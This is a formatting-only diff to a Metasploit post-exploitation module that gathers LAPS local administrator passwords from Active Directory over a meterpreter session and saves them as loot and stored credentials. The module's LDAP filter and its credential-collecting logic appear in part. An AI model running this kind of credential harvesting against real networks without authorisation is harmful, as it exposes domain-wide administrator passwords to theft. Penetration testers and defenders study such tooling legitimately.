@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -8,7 +9,6 @@ require 'msf/core'
 require 'msf/core/auxiliary/report'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::LDAP
 
@@ -17,30 +17,29 @@ class MetasploitModule < Msf::Post
             'ms-MCS-AdmPwd',
             'ms-MCS-AdmPwdExpirationTime'].freeze
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'         => 'Windows Gather Credentials Local Administrator Password Solution',
-      'Description'  => %Q{
-        This module will recover the LAPS (Local Administrator Password Solution) passwords,
-        configured in Active Directory, which is usually only accessible by privileged users.
-        Note that the local administrator account name is not stored in Active Directory,
-        so it is assumed to be 'Administrator' by default.
-      },
-      'License'      => MSF_LICENSE,
-      'Author'       =>
-        [
-          'Ben Campbell',
-        ],
-      'Platform'     => [ 'win' ],
-      'SessionTypes' => [ 'meterpreter' ],
-    ))
+                      'Name'         => 'Windows Gather Credentials Local Administrator Password Solution',
+                      'Description'  => %{
+                        This module will recover the LAPS (Local Administrator Password Solution) passwords,
+                        configured in Active Directory, which is usually only accessible by privileged users.
+                        Note that the local administrator account name is not stored in Active Directory,
+                        so it is assumed to be 'Administrator' by default.
+                      },
+                      'License'      => MSF_LICENSE,
+                      'Author'       =>
+                        [
+                          'Ben Campbell'
+                        ],
+                      'Platform'     => [ 'win' ],
+                      'SessionTypes' => [ 'meterpreter' ]))
 
     register_options([
-      OptString.new('LOCAL_ADMIN_NAME', [true, 'The username to store the password against', 'Administrator']),
-      OptBool.new('STORE_DB', [true, 'Store file in loot.', false]),
-      OptBool.new('STORE_LOOT', [true, 'Store file in loot.', true]),
-      OptString.new('FILTER', [true, 'Search filter.', '(&(objectCategory=Computer)(ms-MCS-AdmPwd=*))'])
-    ], self.class)
+                       OptString.new('LOCAL_ADMIN_NAME', [true, 'The username to store the password against', 'Administrator']),
+                       OptBool.new('STORE_DB', [true, 'Store file in loot.', false]),
+                       OptBool.new('STORE_LOOT', [true, 'Store file in loot.', true]),
+                       OptString.new('FILTER', [true, 'Search filter.', '(&(objectCategory=Computer)(ms-MCS-AdmPwd=*))'])
+                     ], self.class)
 
     deregister_options('FIELDS')
   end
@@ -93,11 +92,11 @@ class MetasploitModule < Msf::Post
         if field.nil?
           row << ""
         else
-          if field[:type] == :number
-            value = convert_windows_nt_time_format(field[:value])
-          else
-            value = field[:value]
-          end
+          value = if field[:type] == :number
+                    convert_windows_nt_time_format(field[:value])
+                  else
+                    field[:value]
+                  end
           row << value
         end
       end
@@ -107,14 +106,12 @@ class MetasploitModule < Msf::Post
       dn = result[FIELDS.index('distinguishedName')][:value]
       expiration = convert_windows_nt_time_format(result[FIELDS.index('ms-MCS-AdmPwdExpirationTime')][:value])
 
-      unless password.to_s.empty?
-        results_table << row
-        laps_results << { hostname: hostname,
-                          password: password,
-                          dn: dn,
-                          expiration: expiration
-        }
-      end
+      next if password.to_s.empty?
+      results_table << row
+      laps_results << { hostname: hostname,
+                        password: password,
+                        dn: dn,
+                        expiration: expiration }
     end
 
     if datastore['STORE_DB']
@@ -128,7 +125,7 @@ class MetasploitModule < Msf::Post
 
       # Match each IP to a host...
       resolve_results.each do |r|
-        l = laps_results.find{ |laps| laps[:hostname] == r[:hostname] }
+        l = laps_results.find { |laps| laps[:hostname] == r[:hostname] }
         l[:ip] = r[:ip]
       end
 
@@ -141,7 +138,6 @@ class MetasploitModule < Msf::Post
 
     results_table
   end
-
 
   def store_creds(username, password, ip)
     service_data = {
@@ -180,9 +176,8 @@ class MetasploitModule < Msf::Post
 
   # https://gist.github.com/nowhereman/189111
   def convert_windows_nt_time_format(windows_time)
-    unix_time = windows_time.to_i/10000000-11644473600
+    unix_time = windows_time.to_i / 10000000 - 11644473600
     ruby_time = Time.at(unix_time)
     ruby_time.strftime("%d/%m/%Y %H:%M:%S GMT %z")
   end
-
 end
